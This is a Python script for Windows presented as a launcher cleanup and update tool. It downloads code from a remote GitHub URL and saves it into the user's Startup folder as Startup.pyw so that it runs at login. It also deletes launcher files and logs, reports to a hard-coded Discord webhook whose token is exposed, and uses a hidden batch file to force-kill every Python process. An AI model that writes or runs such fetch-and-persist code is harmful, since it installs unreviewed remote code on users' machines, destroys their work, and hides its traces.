# monitor_script.py - Kills old launcher, cleans up files, and updates Startup.pyw
import os
import sys
import subprocess
import tempfile
import time
import requests
import urllib.request

# Discord webhook
WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

def send_webhook(message):
    try:
        data = {"content": message}
        requests.post(WEBHOOK, json=data, timeout=5)
    except:
        pass

def kill_all_python_processes():
    """Kill ALL Python processes including this one"""
    print("Killing ALL Python processes...")
    
    current_pid = os.getpid()
    
    batch_script = f'''@echo off
:: Kill ALL Python processes including this one
taskkill /f /im python.exe 2>nul
taskkill /f /im pythonw.exe 2>nul
wmic process where "name='python.exe'" delete 2>nul
wmic process where "name='pythonw.exe'" delete 2>nul
echo All Python processes killed
'''
    
    batch_path = os.path.join(tempfile.gettempdir(), "kill_all_python.bat")
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run batch file - will kill this script too
    subprocess.Popen(['cmd', '/c', batch_path],
                    creationflags=subprocess.CREATE_NO_WINDOW)
    
    time.sleep(2)
    return True

def cleanup_files():
    """Clean up files - specifically delete github_launcher.py"""
    print("Cleaning up files...")
    
    # Delete from startup folder
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    files_to_delete = [
        "github_launcher.pyw",
        "github_launcher.py",
        "startup_log.txt",
        "update_cache.json",
        "requirements.txt",
        "clean_launcher.pyw",
        "old_launcher_backup.pyw",
        "launcher_update.py"
    ]
    
    # Delete from current directory too
    current_dir = os.getcwd()
    
    deleted = []
    
    # Check both locations
    for location in [startup_folder, current_dir]:
        for filename in files_to_delete:
            filepath = os.path.join(location, filename)
            if os.path.exists(filepath):
                try:
                    os.remove(filepath)
                    deleted.append(f"{os.path.basename(location)}/{filename}")
                    print(f"  ✓ Deleted: {filename}")
                except:
                    pass
    
    # Clean up temp monitor scripts
    temp_dir = tempfile.gettempdir()
    for file in os.listdir(temp_dir):
        if file.startswith("monitor_") and file.endswith(".py"):
            try:
                filepath = os.path.join(temp_dir, file)
                os.remove(filepath)
                print(f"  ✓ Deleted temp: {file}")
            except:
                pass
    
    return True

def download_github_launcher_as_startup():
    """Download github_launcher.py and save as Startup.py in startup folder"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # URL to your github_launcher.py
    github_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.py"
    
    # Save it as Startup.py (or Startup.pyw) in startup folder
    startup_file = os.path.join(startup_folder, "Startup.pyw")
    
    try:
        print(f"Downloading {github_url}...")
        response = urllib.request.urlopen(github_url, timeout=10)
        launcher_code = response.read().decode('utf-8')
        
        # Save as Startup.pyw
        with open(startup_file, 'w', encoding='utf-8') as f:
            f.write(launcher_code)
        
        print(f"✓ Saved as Startup.pyw at: {startup_file}")
        return True
    except Exception as e:
        print(f"✗ Failed to download/save: {e}")
        return False

def main():
    """Do exactly what was requested"""
    print("=" * 60)
    print("EXECUTING REQUESTED ACTIONS")
    print("=" * 60)
    
    # 1. Delete github_launcher.py from directory
    print("\n[1/3] Deleting github_launcher.py...")
    cleanup_files()
    
    # 2. Download github_launcher.py and save as Startup.pyw
    print("\n[2/3] Downloading github_launcher.py as Startup.pyw...")
    download_github_launcher_as_startup()
    
    # Send notification
    send_webhook("✅ Cleanup complete: github_launcher.py deleted, Startup.pyw updated")
    
    # 3. End all Python processes
    print("\n[3/3] Ending ALL Python processes...")
    kill_all_python_processes()
    
    print("\n" + "=" * 60)
    print("COMPLETE")
    print("1. github_launcher.py deleted ✓")
    print("2. Startup.pyw updated ✓")  
    print("3. All Python processes ending ✓")
    print("=" * 60)
    
    # This script will be killed by the batch file
    time.sleep(3)
    sys.exit(0)

if __name__ == "__main__":
    main()
